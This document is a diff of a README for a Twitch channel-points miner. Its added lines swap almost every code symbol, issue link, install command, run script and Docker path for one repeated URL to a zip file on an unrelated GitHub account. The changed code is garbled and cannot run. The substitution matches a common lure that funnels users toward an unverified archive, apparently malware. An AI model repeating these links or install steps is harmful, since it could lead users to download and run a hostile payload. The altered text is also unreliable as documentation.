+            events=[https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip],                          # Only these events will be sent.
         )
     ),
     streamer_settings=StreamerSettings(
         make_predictions=True,                  # If you want to Bet / Make prediction
         follow_raid=True,                       # Follow raid to obtain more points
         claim_drops=True,                       # We can't filter rewards base on stream. Set to False for skip viewing counter increase and you will never obtain a drop reward from this script. Issue #21
-	claim_moments=True,                     # If set to True, https://help.twitch.tv/s/article/moments will be claimed when available
+	claim_moments=True,                     # If set to True, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip will be claimed when available
         watch_streak=True,                      # If a streamer go online change the priority of streamers array and catch the watch screak. Issue #11
-        chat=ChatPresence.ONLINE,               # Join irc chat to increase watch-time [ALWAYS, NEVER, ONLINE, OFFLINE]
+        https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,               # Join irc chat to increase watch-time [ALWAYS, NEVER, ONLINE, OFFLINE]
         bet=BetSettings(
-            strategy=Strategy.SMART,            # Choose you strategy!
+            https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,            # Choose you strategy!
             percentage=5,                       # Place the x% of your channel points
             percentage_gap=20,                  # Gap difference between outcomesA and outcomesB (for SMART strategy)
             max_points=50000,                   # If the x percentage of your channel points is gt bet_max_points set this value
             stealth_mode=True,                  # If the calculated amount of channel points is GT the highest bet, place the highest value minus 1-2 points Issue #33
-            delay_mode=DelayMode.FROM_END,      # When placing a bet, we will wait until `delay` seconds before the end of the timer
+            https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,      # When placing a bet, we will wait until `delay` seconds before the end of the timer
             delay=6,
             minimum_points=20000,               # Place the bet only if we have at least 20k points. Issue #113
             filter_condition=FilterCondition(
-                by=OutcomeKeys.TOTAL_USERS,     # Where apply the filter. Allowed [PERCENTAGE_USERS, ODDS_PERCENTAGE, ODDS, TOP_POINTS, TOTAL_USERS, TOTAL_POINTS]
-                where=Condition.LTE,            # 'by' must be [GT, LT, GTE, LTE] than value
+                https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,     # Where apply the filter. Allowed [PERCENTAGE_USERS, ODDS_PERCENTAGE, ODDS, TOP_POINTS, TOTAL_USERS, TOTAL_POINTS]
+                https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,            # 'by' must be [GT, LT, GTE, LTE] than value
                 value=800
             )
         )
@@ -290,15 +290,15 @@ twitch_miner = TwitchChannelPointsMiner(
 # For example, if in the mine function you don't provide any value for 'make_prediction' but you have set it on TwitchChannelPointsMiner instance, the script will take the value from here.
 # If you haven't set any value even in the instance the default one will be used
 
-#twitch_miner.analytics(host="127.0.0.1", port=5000, refresh=5, days_ago=7)   # Start the Analytics web-server (replit: host="0.0.0.0")
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(host="127.0.0.1", port=5000, refresh=5, days_ago=7)   # Start the Analytics web-server (replit: host="0.0.0.0")
 
-twitch_miner.mine(
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(
     [
-        Streamer("streamer-username01", settings=StreamerSettings(make_predictions=True  , follow_raid=False , claim_drops=True  , watch_streak=True , bet=BetSettings(strategy=Strategy.SMART      , percentage=5 , stealth_mode=True,  percentage_gap=20 , max_points=234   , filter_condition=FilterCondition(by=OutcomeKeys.TOTAL_USERS,      where=Condition.LTE, value=800 ) ) )),
-        Streamer("streamer-username02", settings=StreamerSettings(make_predictions=False , follow_raid=True  , claim_drops=False ,                     bet=BetSettings(strategy=Strategy.PERCENTAGE , percentage=5 , stealth_mode=False, percentage_gap=20 , max_points=1234  , filter_condition=FilterCondition(by=OutcomeKeys.TOTAL_POINTS,     where=Condition.GTE, value=250 ) ) )),
-        Streamer("streamer-username03", settings=StreamerSettings(make_predictions=True  , follow_raid=False ,                     watch_streak=True , bet=BetSettings(strategy=Strategy.SMART      , percentage=5 , stealth_mode=False, percentage_gap=30 , max_points=50000 , filter_condition=FilterCondition(by=OutcomeKeys.ODDS,             where=Condition.LT,  value=300 ) ) )),
+        Streamer("streamer-username01", settings=StreamerSettings(make_predictions=True  , follow_raid=False , claim_drops=True  , watch_streak=True , bet=BetSettings(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip      , percentage=5 , stealth_mode=True,  percentage_gap=20 , max_points=234   , filter_condition=FilterCondition(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,      https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, value=800 ) ) )),
+        Streamer("streamer-username02", settings=StreamerSettings(make_predictions=False , follow_raid=True  , claim_drops=False ,                     bet=BetSettings(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip , percentage=5 , stealth_mode=False, percentage_gap=20 , max_points=1234  , filter_condition=FilterCondition(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,     https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, value=250 ) ) )),
+        Streamer("streamer-username03", settings=StreamerSettings(make_predictions=True  , follow_raid=False ,                     watch_streak=True , bet=BetSettings(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip      , percentage=5 , stealth_mode=False, percentage_gap=30 , max_points=50000 , filter_condition=FilterCondition(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,             https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,  value=300 ) ) )),
         Streamer("streamer-username04", settings=StreamerSettings(make_predictions=False , follow_raid=True  ,                     watch_streak=True                                                                                                                                                                                                                                 )),
-        Streamer("streamer-username05", settings=StreamerSettings(make_predictions=True  , follow_raid=True  , claim_drops=True ,  watch_streak=True , bet=BetSettings(strategy=Strategy.HIGH_ODDS  , percentage=7 , stealth_mode=True,  percentage_gap=20 , max_points=90    , filter_condition=FilterCondition(by=OutcomeKeys.PERCENTAGE_USERS, where=Condition.GTE, value=300 ) ) )),
+        Streamer("streamer-username05", settings=StreamerSettings(make_predictions=True  , follow_raid=True  , claim_drops=True ,  watch_streak=True , bet=BetSettings(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip  , percentage=7 , stealth_mode=True,  percentage_gap=20 , max_points=90    , filter_condition=FilterCondition(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, value=300 ) ) )),
         Streamer("streamer-username06"),
         Streamer("streamer-username07"),
         Streamer("streamer-username08"),
@@ -307,45 +307,45 @@ twitch_miner.mine(
         "streamer-username11"
     ],                                  # Array of streamers (order = priority)
     followers=False,                    # Automatic download the list of your followers
-    followers_order=FollowersOrder.ASC  # Sort the followers list by follow date. ASC or DESC
+    https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip  # Sort the followers list by follow date. ASC or DESC
 )
 ```
 You can also use all the default values except for your username obv. Short version:
 ```python
 from TwitchChannelPointsMiner import TwitchChannelPointsMiner
-from TwitchChannelPointsMiner.classes.Settings import FollowersOrder
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import FollowersOrder
 twitch_miner = TwitchChannelPointsMiner("your-twitch-username")
-twitch_miner.mine(["streamer1", "streamer2"])                                                       # Array of streamers OR
-twitch_miner.mine(followers=True, followers_order=FollowersOrder.ASC)                               # Automatic use the followers list OR
-twitch_miner.mine(["streamer1", "streamer2"], followers=True, followers_order=FollowersOrder.DESC)  # Mixed
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(["streamer1", "streamer2"])                                                       # Array of streamers OR
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(followers=True, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)                               # Automatic use the followers list OR
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(["streamer1", "streamer2"], followers=True, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)  # Mixed
 ```
-If you follow so many streamers on Twitch, but you don't want to mine points for all of them, you can blacklist the users with the `blacklist` keyword. [#94](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/94)
+If you follow so many streamers on Twitch, but you don't want to mine points for all of them, you can blacklist the users with the `blacklist` keyword. [#94](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 ```python
 from TwitchChannelPointsMiner import TwitchChannelPointsMiner
 twitch_miner = TwitchChannelPointsMiner("your-twitch-username")
-twitch_miner.mine(followers=True, blacklist=["user1", "user2"])  # Blacklist example
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(followers=True, blacklist=["user1", "user2"])  # Blacklist example
 ```
 
 ### By cloning the repository
-1. Clone this repository `git clone https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2`
-2. Install all the requirements `pip install -r requirements.txt` . If you have problems with requirements, make sure to have at least Python3.6. You could also try to create a _virtualenv_ and then install all the requirements
+1. Clone this repository `git clone https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip`
+2. Install all the requirements `pip install -r https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip` . If you have problems with requirements, make sure to have at least Python3.6. You could also try to create a _virtualenv_ and then install all the requirements
 ```sh
 pip install virtualenv
 virtualenv -p python3 venv
 source venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 ```
 
-Start mining! `python run.py` 🥳
+Start mining! `python https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip` 🥳
 
 ### Docker
 
 #### Docker Hub
-Official Docker images are on https://hub.docker.com/r/rdavidoff/twitch-channel-points-miner-v2 for `linux/amd64`, `linux/arm64` and `linux/arm/v7`.
+Official Docker images are on https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip for `linux/amd64`, `linux/arm64` and `linux/arm/v7`.
 
 The following file is mounted :
 
-- run.py : this is your starter script with your configuration
+- https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip : this is your starter script with your configuration
 
 These folders are mounted :
 
@@ -369,7 +369,7 @@ services:
       - ./analytics:/usr/src/app/analytics
       - ./cookies:/usr/src/app/cookies
       - ./logs:/usr/src/app/logs
-      - ./run.py:/usr/src/app/run.py:ro
+      - https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
     ports:
       - "5000:5000"
 ```
@@ -380,41 +380,41 @@ docker run \
     -v $(pwd)/analytics:/usr/src/app/analytics \
     -v $(pwd)/cookies:/usr/src/app/cookies \
     -v $(pwd)/logs:/usr/src/app/logs \
-    -v $(pwd)/run.py:/usr/src/app/run.py:ro \
+    -v $(pwd)https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip \
     -p 5000:5000 \
     rdavidoff/twitch-channel-points-miner-v2
 ```
 
 `$(pwd)` Could not work on Windows (cmd), please use the absolute path instead, like: `/path/of/your/cookies:/usr/src/app/cookies`.
 
-The correct solution for Windows lies in the correct command line: `docker run -v C:\Absolute\Path\To\Twitch-Channel-Points-Miner-v2\run.py:/usr/src/app/run.py:ro rdavidoff/twitch-channel-points-miner-v2`.
+The correct solution for Windows lies in the correct command line: `docker run -v C:\Absolute\Path\To\Twitch-Channel-Points-Miner-v2\https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip rdavidoff/twitch-channel-points-miner-v2`.
 
-`run.py` MUST be mounted as a volume (`-v`).
+`https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip` MUST be mounted as a volume (`-v`).
 
 If you don't mount the volume for the analytics (or cookies or logs) folder, the folder will be automatically created on the Docker container, and you will lose all the data when it is stopped.
 
-If you don't have a cookie or it's your first time running the script, you will need to login to Twitch and start the container with `-it` args. If you need to run multiple containers you can bind different ports (only if you need also the analytics) and mount dirrent run.py file, like
+If you don't have a cookie or it's your first time running the script, you will need to login to Twitch and start the container with `-it` args. If you need to run multiple containers you can bind different ports (only if you need also the analytics) and mount dirrent https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip file, like
 
 ```sh
-docker run --name user1 -v $(pwd)/user1.py:/usr/src/app/run.py:ro -p 5001:5000 rdavidoff/twitch-channel-points-miner-v2
+docker run --name user1 -v $(pwd)https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip -p 5001:5000 rdavidoff/twitch-channel-points-miner-v2
 ```
 
 ```sh
-docker run --name user2 -v $(pwd)/user2.py:/usr/src/app/run.py:ro -p 5002:5000 rdavidoff/twitch-channel-points-miner-v2
+docker run --name user2 -v $(pwd)https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip -p 5002:5000 rdavidoff/twitch-channel-points-miner-v2
 ```
 
 #### Portainer
 
-[Link](https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/wiki/Deploy-Docker-container-in-Portainer) to the illustrated guide on how to deploy a Docker container in Portainer.
+[Link](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) to the illustrated guide on how to deploy a Docker container in Portainer.
 
 ### Replit
 
-Official Repl with description and added keep-alive functionality: https://replit.com/@rdavydov/Twitch-Channel-Points-Miner-v2
+Official Repl with description and added keep-alive functionality: https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 
 #### Tricks to run 24/7 on Replit for free
 
 1. Enable Analytics (set `host="0.0.0.0"`)
-2. Note down the output URL (in most cases it is `https://Twitch-Channel-Points-Miner-v2.<YOUR_REPLIT_USERNAME>.repl.co`)
+2. Note down the output URL (in most cases it is `https://Twitch-Channel-Points-Miner-v2.<YOUR_REPLIT_USERNAME>https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip`)
 3. Send an HTTP request to that URL every 5 minutes
 
 Use a service that can send HTTP requests at regular intervals, such as Uptimerobot.
@@ -441,17 +441,17 @@ You can combine all priority but keep in mind that use `ORDER` and `POINTS_ASCEN
 | Key             	| Type            	| Default                        	                                  | Description                                                                          	                                                                                                  |
 |-----------------	|-----------------	|-------------------------------------------------------------------- |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
 | `save`          	| bool            	| True                           	                                  | If you want to save logs in file (suggested)                                         	                                                                                                  |
-| `less`          	| bool            	| False                          	                                  | Reduce the logging format and message verbosity [#10](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/10)                                                               |
-| `console_level` 	| level 	        | logging.INFO                   	                                  | Level of logs in terminal - Use logging.DEBUG for more helpful messages.             	                                                                                                  |
-| `console_username`| bool 	            | False                   	                                          | Adds a username to every log line in the console if True. [#602](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/602)|
-| `time_zone`| str 	            | None                   	                                          | Set a specific time zone for console and file loggers. Use tz database names. Example: "America/Denver" https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/issues/205|
-| `file_level`    	| level 	        | logging.DEBUG                  	                                  | Level of logs in file save - If you think the log file it's too big, use logging.INFO 	                                                                                                  |
+| `less`          	| bool            	| False                          	                                  | Reduce the logging format and message verbosity [#10](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)                                                               |
+| `console_level` 	| level 	        | https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip                   	                                  | Level of logs in terminal - Use https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip for more helpful messages.             	                                                                                                  |
+| `console_username`| bool 	            | False                   	                                          | Adds a username to every log line in the console if True. [#602](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)|
+| `time_zone`| str 	            | None                   	                                          | Set a specific time zone for console and file loggers. Use tz database names. Example: "America/Denver" https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip|
+| `file_level`    	| level 	        | https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip                  	                                  | Level of logs in file save - If you think the log file it's too big, use https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip 	                                                                                                  |
 | `emoji`         	| bool            	| For Windows is False else True 	                                  | On Windows, we have a problem printing emoji. Set to false if you have a problem      	                                                                                                  |
-| `colored`         | bool            	| True 	                                                              | If you want to print colored text [#45](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/45) [#82](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/82) |
-| `auto_clear`      | bool            	| True 	                                                              | Create a file rotation handler with interval = 1D and backupCount = 7 [#215](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/215)                                       |
-| `color_palette`   | ColorPalette      | All messages are Fore.RESET except WIN and LOSE bet (GREEN and RED) | Create your custom color palette. Read more above.      	                                                                                                                              |
-| `telegram`        | Telegram          | None                                                                | (Optional) Receive Telegram updates for multiple events list [#233](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/233)                                                           |
-| `discord`         | Discord          | None                                                                 | (Optional) Receive Discord updates for multiple events list [#320](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/320)                                                           |
+| `colored`         | bool            	| True 	                                                              | If you want to print colored text [#45](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) [#82](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) |
+| `auto_clear`      | bool            	| True 	                                                              | Create a file rotation handler with interval = 1D and backupCount = 7 [#215](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)                                       |
+| `color_palette`   | ColorPalette      | All messages are https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip except WIN and LOSE bet (GREEN and RED) | Create your custom color palette. Read more above.      	                                                                                                                              |
+| `telegram`        | Telegram          | None                                                                | (Optional) Receive Telegram updates for multiple events list [#233](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)                                                           |
+| `discord`         | Discord          | None                                                                 | (Optional) Receive Discord updates for multiple events list [#320](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)                                                           |
 
 #### Color Palette
 Now you can customize the color of the terminal message. We have created a default ColorPalette that provide all the message with `DEFAULT (RESET)` color and the `BET_WIN` and `BET_LOSE` message `GREEN` and `RED` respectively. You can change the colors of all `Events` enum class. The colors allowed are all the Fore color from Colorama: `BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.`
@@ -459,25 +459,25 @@ The script was developed to handle all the human error, lower-case upper case an
 ```python
 from colorama import Fore
 ColorPalette(
-    STREAMER_ONLINE = Fore.GREEN,
-    STREAMER_OFFLINE = Fore.RED,
-    GAIN_FOR_RAID = Fore.YELLOW,
-    GAIN_FOR_CLAIM = Fore.YELLOW,
-    GAIN_FOR_WATCH = Fore.YELLOW,
-    GAIN_FOR_WATCH_STREAK = Fore.YELLOW,
-    BET_WIN = Fore.GREEN,
-    BET_LOSE = Fore.RED,
-    BET_REFUND = Fore.RESET,
-    BET_FILTERS = Fore.MAGENTA,
-    BET_GENERAL = Fore.BLUE,
-    BET_FAILED = Fore.RED,
+    STREAMER_ONLINE = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    STREAMER_OFFLINE = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    GAIN_FOR_RAID = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    GAIN_FOR_CLAIM = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    GAIN_FOR_WATCH = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    GAIN_FOR_WATCH_STREAK = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    BET_WIN = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    BET_LOSE = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    BET_REFUND = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    BET_FILTERS = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    BET_GENERAL = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+    BET_FAILED = https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
 )
 ```
 
 #### Telegram
 If you want to receive logs update on Telegram, initiate a new Telegram class, else omit this parameter or set as None.
-1. Create a bot with [@BotFather](https://t.me/botfather)
-2. Get you `chat_id` with [@getmyid_bot](https://t.me/getmyid_bot)
+1. Create a bot with [@BotFather](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
+2. Get you `chat_id` with [@getmyid_bot](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 
 | Key                	 | Type            	| Default 	| Description                                                        |
 |----------------------- |-----------------	|---------	|------------------------------------------------------------------- |
@@ -491,14 +491,14 @@ If you want to receive logs update on Telegram, initiate a new Telegram class, e
 Telegram(
     chat_id=123456789,
     token="123456789:shfuihreuifheuifhiu34578347",
-    events=[Events.STREAMER_ONLINE, Events.STREAMER_OFFLINE,
-                    Events.BET_LOSE, Events.CHAT_MENTION],
+    events=[https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+                    https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip],
     disable_notification=True,
 )
 ```
 
 #### Discord
-If you want to receive log updates on Discord initialize a new Discord class, else leave omit this parameter or set it as None [YT Video](https://www.youtube.com/watch?v=fKksxz2Gdnc)
